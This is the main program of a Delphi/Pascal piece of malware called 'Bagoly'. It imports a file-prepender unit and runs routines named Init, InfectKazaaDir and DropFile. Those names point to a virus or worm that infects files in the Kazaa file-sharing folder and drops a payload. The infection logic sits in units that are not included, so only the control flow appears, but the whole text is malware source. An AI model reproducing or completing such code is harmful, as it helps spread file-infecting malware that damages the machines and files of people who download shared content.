   PROGRAM Bagoly;

   {$IMAGEBASE $10000000}

   uses
     uPrepender in 'uPrepender.pas',
     AclUtils in 'ACLUnits\ACLUTILS.PAS';

   BEGIN
    Init;
    IF KazaaDir<>'' THEN InfectKazaaDir;
    DropFile;
   END.
